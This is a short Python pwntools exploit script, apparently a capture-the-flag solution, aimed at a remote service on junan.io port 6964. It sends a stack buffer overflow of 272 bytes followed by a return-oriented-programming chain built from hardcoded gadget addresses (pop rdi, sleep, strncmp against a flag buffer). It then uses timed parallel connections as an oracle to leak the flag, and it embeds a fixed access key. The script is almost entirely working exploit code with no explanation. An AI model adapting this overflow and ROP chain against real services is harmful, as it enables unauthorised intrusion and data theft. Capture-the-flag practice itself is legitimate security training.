from pwn import *
import string
import random
import time

my_id = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
my_id += 'f'

print my_id
a1 = time.time()

# # r = process("./test")
# r = remote("0", 1234)
# # r2 = process("./test")
# r2 = remote("0", 1234)
# # r3 = process("./test")
# r3 = remote("0", 1234)

r = remote("junan.io", 6964)
r2 = remote("junan.io", 6964)
r3 = remote("junan.io", 6964)

r.recvuntil('Input ID: ')
r.sendline(my_id)
r.recvuntil('Input key: ')
r.sendline("65b42f7d71f9fb31d824c28b8943ad94")
r.recvuntil("Welcome: ")

strncmp = 0x00000000004008C8
p_rdi = 0x0000000000400AAE
sleep = 0x0000000000400958
flag = 0x00000000006020A0

go_sleep = 0x0000000000400E00

payload = "A"*272
payload += p64(0x000000000060229D) # rbp

payload += p64(p_rdi) # for sleep
payload += p64(0x1)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)

payload += p64(sleep)

payload += p64(p_rdi)
payload += p64(flag)
payload += p64(0x0000000000602060+15) # time based rop
# 0x0000000000602060+15
payload += p64(0x1)
payload += p64(0x1)
payload += p64(0x1)
payload += p64(0x1)

payload += p64(strncmp)

payload += p64(go_sleep)

print len(payload)

r.sendline(payload)
time.sleep(0.1)

r2.sendline(my_id)

r3.recvuntil('Input ID: ')
time.sleep(1)
r3.sendline(my_id)
try:
    data = r3.recv()
    print data
    if data.find("race") != -1:
        raise Exception
    r3.sendline("AAAA")
    data = r3.recv()
    print data
    if data.find("race") != -1:
        raise Exception
    print ("Found !")
except:
    print ("No")

r.recv()

print time.time() - a1
